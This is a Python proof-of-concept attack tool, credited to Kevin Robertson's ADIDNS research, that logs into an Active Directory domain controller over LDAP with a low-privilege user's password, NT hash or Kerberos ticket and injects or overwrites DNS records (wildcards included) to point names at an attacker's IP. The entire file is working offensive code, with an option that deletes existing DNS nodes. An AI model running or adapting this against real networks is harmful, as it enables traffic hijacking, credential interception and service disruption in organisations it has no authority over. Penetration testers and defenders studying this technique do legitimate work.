# The original idea was written by Kevin Robertson at https://blog.netspi.com/exploiting-adidns, so
# all the credits goes for him.
#
# This is just a simple PoC based on that idea, but instead of PowerShell, it uses Python, for being
# of help for those escenarios where you have a Domain User credentials but don't have access to 
# a Windows box on the network and prefer to continue with your beloved Kali box.
# 

import sys
import imp
import logging
import argparse
import json
import traceback
import time
import struct
import dns.resolver
import base64
from datetime import datetime

# Verifies the importation of ldap3
try:
    imp.find_module('ldap3')
    import ldap3
    from ldap3 import Server, Connection
    from ldap3 import ALL, NTLM, KERBEROS, SASL, AUTO_BIND_NONE, SUBTREE, ALL_ATTRIBUTES
except ImportError:
    print '[-] The required module ldap3 is not available. Please install it and try again.'
    sys.exit(1)


class DNSRecord():
    type = {
        'A': 0x0001,
        0x0001: 'A'
    }
    unsupported_type = 'UNSUPPORTED_TYPE'

    def __init__(self, data, dns_server, zone, static=False):
        self.data_length = struct.pack('<H', 0x0004)		  # DataLength (2 bytes) = length in bytes of the DATA field
        self.type = struct.pack('<H', DNSRecord.type['A'])	  # Type (2 bytes) = resource record's type
        self.version = struct.pack('<B', 0x05)				  # Version (1 bytes) = 0x05 (Always 0x05)
        self.rank = struct.pack('<B', 0xF0)					  # Rank (1 bytes) = 0xF0 (RANK_ZONE)
        self.flags = struct.pack('<H', 0x0000)				  # Flags (2 bytes) = 0x0000 (Not used)
        													  # Serial (4 bytes) = Serial number of the SOA + 1
        self.serial = struct.pack('<L', self.getNextSOASerial(dns_server, zone))
        self.tls_seconds = struct.pack('>L', 0x00000258)	  # TlsSeconds (4 bytes) = 0x258 (600 TTL)
        self.reserved = struct.pack('<L', 0x0000000)		  # Reserved (4 bytes) = 0x00000000 (Not used)
        if static:                                            
            self.timestamp = struct.pack('<L', 0x0)			  # TimeStamp (4 bytes) = The time stamp, in hours, for the  
															  # 					  record when it received the last update.
        else:
            self.timestamp = struct.pack('<L', self.getTimestamp())
        data = data.split('.')
        self.data = struct.pack('<BBBB', int(data[0]),        # Data
                                         int(data[1]),
                                         int(data[2]),
                                         int(data[3]))

    def getRecord(self):
        dns_record = self.data_length   #2
        dns_record += self.type         #2
        dns_record += self.version      #1
        dns_record += self.rank         #1
        dns_record += self.flags        #2
        dns_record += self.serial       #4
        dns_record += self.tls_seconds  #4
        dns_record += self.reserved     #4
        dns_record += self.timestamp    #4
        dns_record += self.data         #N

        return dns_record

    def getNextSOASerial(self, dns_server, zone):
        logging.debug('[D] Creating a DNS Resolver.')
        dnser = dns.resolver.Resolver()
        dnser.nameservers = [dns_server]
        dnser.timeout = 2.0
        logging.debug('[D] Querying SOA type record from dns server "' + dns_server + '" ...')
        resp = dnser.query(zone, 'SOA')
        if resp is not None:
            logging.debug('[D] SOA record found for zone "' + zone + '" ...')
            return (resp[0].serial + 1)
        return 0x0

    def getTimestamp(self):
        delta = datetime.utcnow() - datetime(1601, 1, 1)
        hours = delta.days * 24 + delta.seconds / 60 / 60
        return hours
 
    @staticmethod
    def getTypeFromDNSRecord(dns_record):
        try:
            return DNSRecord.type[struct.unpack('<H', dns_record[2:4])[0]]
        except:
            return DNSRecord.unsupported_type

    @staticmethod
    def getDataFromDNSRecord(dns_record):
        if DNSRecord.getTypeFromDNSRecord(dns_record) == 'A':
            data = dns_record[24:]
            ip_address = ''
            for byte in data:
                ip_address += str(ord(byte)) + '.'
            return ip_address[:-1]
        return DNSRecord.unsupported_type

class LdapManager():
    dns_node_attrs = ['dn', 'dc', 'name', 'dnsRecord', 'dNSTombstoned']

    """
    This method allows the use of nt passwords as well as hashes in the format lmhash:nthash
    """
    def __init__(self, server, port=389, ssl=False, kerberos=False, ntuser=None, ntpass=None):
        self._server = server
        self._port = port
        self._ssl = ssl
        self._kerberos = kerberos
        self._ntuser = ntuser
        self._ntpass = ntpass
        self._delay = 1
        self._page_records = None
        self._query_delay = 1
        self._timeout = None
        self._base = ''

    def get_dn(self, domain):
        dn = ''
        for part in domain.split('.'):
            dn += 'DC=' + part + ','

        return dn[:-1]

    def connect(self):
        """ 
            LDAP connection method.

            Connects to an AD LDAP server via NTLM or KERBEROS authentication.
            This method supports the use of a plaintext password as well as 
            NTLM hashes.
            HASH = LMHASH:NTHASH

            Returns
            -------
            bool
                Returns the state of the connection.
        """        
        logging.info('[*] Creating an LDAP connection.')
        s = Server(self._server, port=self._port, use_ssl=self._ssl,
                   connect_timeout=self._timeout, get_info=ALL)

        if self._kerberos:
            # Use Kerberos
            logging.info('[*] Using KERBEROS authentication.')
            try:
                self._conn = Connection(s, auto_bind=AUTO_BIND_NONE, authentication=SASL, 
                                        sasl_mechanism=KERBEROS, read_only=False, 
                                        return_empty_attributes=True)
                bind_result = self._conn.bind()
            except Exception as e:
                msg = e.message.encode('ascii', 'ignore')
                if msg.lower().find('no kerberos credentials available (default cache: file:/tmp/') != -1:
                    logging.error('[-] Kerberos binding error.')
                    logging.debug('[D] You need a valid kerberos TGT ticket or an LDAP TGS ticket for accessing the remote service.')
                    logging.debug('[D] Save the kerberos ticket ccache DB into /tmp/krb5cc_<uid> and try again.')
                elif msg.lower().find('ticket expired') != -1:
                    logging.error('[-] Kerberos binding error.')
                    logging.debug('[D] The provided Ticket has expired. Please provide a valid one and try again.')
                else:
                    logging.error('[-] Unexpected binding error.')
                    logging.debug('[D] Observe the following traceback:')
                    logging.debug(traceback.format_exc())
                return False
        else:
            # Use NTLM authentication 
            logging.info('[*] Using NTLM authentication.')
            try:
                self._conn = Connection(s, auto_bind=AUTO_BIND_NONE, authentication=NTLM,
                                        user=self._ntuser, password=self._ntpass, read_only=False)
                bind_result = self._conn.bind()
            except:
                logging.error('[-] Unexpected binding error.')
                logging.debug('[D] Observe the following traceback:')
                logging.debug(traceback.format_exc())
                return False

        # Takes the root naming context
        if bind_result:
            self._base = json.loads(s.info.to_json())['raw']['rootDomainNamingContext'][0]
            logging.debug('[D] Binding base: %s' % self._base)
        else:
            logging.debug('[D] An error ocurred during the binding process.')
            logging.debug('[D] Ldap API Message: %s' % self._conn.result['description'])
            return False

        return True

    def generic_search(self, base, s_filter, attributes):
        """
            Performs a generic LDAP search.

            Returns
                list[] : A JSON formatted list of objected.
        """
        if base is None:
            base = self._base
        if attributes is None:
            attributes = ALL_ATTRIBUTES
        json_list = []
        cookie = None
        while cookie == None or cookie != '':
            try:
                logging.debug('[D] Searching on base: %s' % base)
                logging.debug('[D] Searching with filter: %s' % s_filter)
                logging.debug('[D] Searching the attributes: %s' % attributes)
                self._conn.search(search_base = base,
                                  search_filter = s_filter, 
                                  search_scope = SUBTREE,
                                  attributes=attributes,
                                  paged_size=self._page_records, 
                                  paged_cookie=cookie)
            except ldap3.core.exceptions.LDAPInvalidFilterError as e:
                logging.error('[-] Search error: invalid LDAP query filter')
                logging.debug('[D] %s' % e.message)
                logging.debug('[D] Filter: %s' % s_filter)
                break
            except Exception:
                logging.error('[-] Unexpected search error.')
                logging.debug('[D] Observe the following traceback:')
                logging.debug(traceback.format_exc())
                break

            try:
                cookie = self._conn.result['controls']['1.2.840.113556.1.4.319']['value']['cookie']
            except:
                cookie = ''
            # Waits for n seconds before querying again
            time.sleep(self._query_delay) 
            for entry in self._conn.entries:
                # Adds the new records to the list of json objects
                json_list.append(json.loads(entry.entry_to_json()))

        return json_list

    def get_dns_node_info(self, domain, name):
        """
            Gets DNS nodes.
        
            Returns
                list[]
                    A JSON formatted list of dnsNode class LDAP objects with ceretain attributes.
        """
        # It uses the full dn (including the name) because it requires to identify those nodes for
        # which the authenticated user does NOT have privileges and their attributes cannot be obtained
        domain_dn = self.get_dn(domain)
        node_dn = 'DC=' + name + ',DC=' + domain + ',CN=MicrosoftDNS,DC=DomainDnsZones,' + domain_dn
        search_filter = '(objectClass=*)'
        dns_nodes = self.generic_search(node_dn, search_filter, LdapManager.dns_node_attrs[1:])

        dns_record_list = []
        if len(dns_nodes) != 0:
            if dns_nodes[0]['attributes']['name'] == []:
                logging.debug('[D] Looks like you don\'t have permissions to read the node\'s attributes...')
            else:
                dns_records = dns_nodes[0]['attributes']['dnsRecord']
                for dns_record in dns_records:
                    dns_record = base64.b64decode(dns_record['encoded'])
                    pair = []
                    pair.append(DNSRecord.getTypeFromDNSRecord(dns_record))
                    pair.append(DNSRecord.getDataFromDNSRecord(dns_record))
                    dns_record_list.append(pair)
        
        return dns_record_list
        
    def delete_dns_node(self, domain, name):
        """
            Removes a DNS node.
        
            Returns
                Result of operation
                    Status
        """
        domain_dn = self.get_dn(domain)
        node_dn = 'DC=' + name + ',DC=' + domain + ',CN=MicrosoftDNS,DC=DomainDnsZones,' + domain_dn
        
        try:
            logging.debug('[D] About to remove DNS node at dn: %s' % node_dn)
            self._conn.delete(node_dn)
            logging.debug('[D] LDAP Result: ' + self._conn.result['description'])
        except Exception:
            logging.error('[-] Unexpected search error.')
            logging.debug('[D] Observe the following traceback:')
            logging.debug(traceback.format_exc())
            return False

        if self._conn.result['description'] == 'noSuchObject':
            print '|[*] The specified object does not exist.'
            return False
        else:
            print '[*] The object was successfully removed.'
            return True
        
    def add_dns_node(self, domain, dns_server, name, attacker_ip):
        """
            Adds a DNS node.
        
            Returns
                Boolean
                    Status
        """
        domain_dn = self.get_dn(domain)
        node_dn = 'DC=' + name + ',DC=' + domain + ',CN=MicrosoftDNS,DC=DomainDnsZones,' + domain_dn
        objectClass = ['top', 'dnsNode']
        dnsRecord = DNSRecord(attacker_ip, dns_server, domain)
        
        attributes = {'dNSTombstoned': True,
                      'dnsRecord': dnsRecord.getRecord()}
        try:
            logging.debug('[D] About to add DNS node at dn: %s' % node_dn)
            self._conn.add(node_dn, objectClass, attributes)
            logging.debug('[D] LDAP Result: ' + self._conn.result['description'])
        except Exception:
            logging.error('[-] Unexpected search error.')
            logging.debug('[D] Observe the following traceback:')
            logging.debug(traceback.format_exc())
            return False
        
        if self._conn.result['description'] == 'noSuchObject':
            print '[*] The specified object does not exist.'
            return False
        else:
            print '[*] The object was successfully added.'
            return True      


if __name__ == '__main__':
    import argparse, re

    custom_usage = 'python %s [options]' % (sys.argv[0].split('/')[-1])
    parser = argparse.ArgumentParser(add_help = True, usage=custom_usage, 
                                     description = 'Inserts DNS records via LDAP on AD.',
                                     epilog = 'Happy hunting!')

    parser.add_argument('-d', action='store', metavar = 'DOMAIN', required=True, help='Windows domain name (e.g. bransh.local)')
    parser.add_argument('-u', action='store', metavar = 'USER', required=True, help='Domain username (no need to be an admin)')

    group_creds = parser.add_mutually_exclusive_group(required=True)
    group_creds.add_argument('-p', action='store', metavar = 'PASSWORD', help='Plaintext password')
    group_creds.add_argument('-hash', action='store', metavar = 'NTHASH', help='NT hash')
    group_creds.add_argument('-k', action='store_true', help='Use Kerberos authentication. Tickets will be obtained '
                                                             'from the CCACHE file pointed by env:KRB5CCNAME')
    parser.add_argument('-debug', action='store_true', help='Print DEBUGGING information')
    group_action = parser.add_argument_group('DNS arguments')
    group_action.add_argument('-dc', action='store', required=True, help='Target DC LDAP server')
    group_action.add_argument('-ip', action='store', required=True, help='IP for the DNS record (e.g. attacker IP)')
    group_action.add_argument('-name', action='store', required=True, help='Name of the DNS entry (e.g. server, *, etc.)')
    group_action.add_argument('-overwrite', action='store_true', help='Writes a DNS node even though it exists')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    
    # Set debugging format and level
    DEBUG_MSG_FORMAT = '%(message)s'
    logging.basicConfig(format=DEBUG_MSG_FORMAT)    
    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
    else:
        logging.getLogger().setLevel(logging.INFO)

    
    # Evaluate if the target dns is an IP or a name
    attacker_ip = options.ip
    if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', attacker_ip):
        logging.debug('[D] Provided attacker ip is a valid IP address (%s).' % attacker_ip)
    else:
        logging.debug('[D] Provided attacker ip is not a valid IP address, cannot continue.')
        sys.exit(1)

    # Initialize Ldap manager
    domain = options.d
    user = options.u
    domain_username = domain + '\\' + user
    dc = options.dc

    if options.k:
        ldap_access = LdapManager(dc, kerberos=True)
    elif options.hash is not None:
        nthash = options.hash + ':' + options.hash
        ldap_access = LdapManager(dc, ntuser=domain_username, ntpass=nthash)
    elif options.p is not None:
        password = options.p
        ldap_access = LdapManager(dc, ntuser=domain_username, ntpass=password)

    if not ldap_access.connect():
        logging.info('[*] An error ocurred when connecting to the LDAP server.')
        sys.exit(1)

    dns_record_list = ldap_access.get_dns_node_info(domain, options.name)
    if len(dns_record_list) != 0:
        logging.info('[*] DNS node already exists:')
        for record in dns_record_list:
            logging.info('    Type: %s | Data: %s' % (record[0], record[1]))
        if options.overwrite:
            logging.info('[*] The DNS node will be removed and a new one will be added.')
            if ldap_access.delete_dns_node(domain, options.name):
                ldap_access.add_dns_node(domain, dc, options.name, attacker_ip)
        else:
            logging.info('[!] In order to write new data on an existent DNS node, use the option -overwrite.')
    else:
        ldap_access.add_dns_node(domain, dc, options.name, attacker_ip)
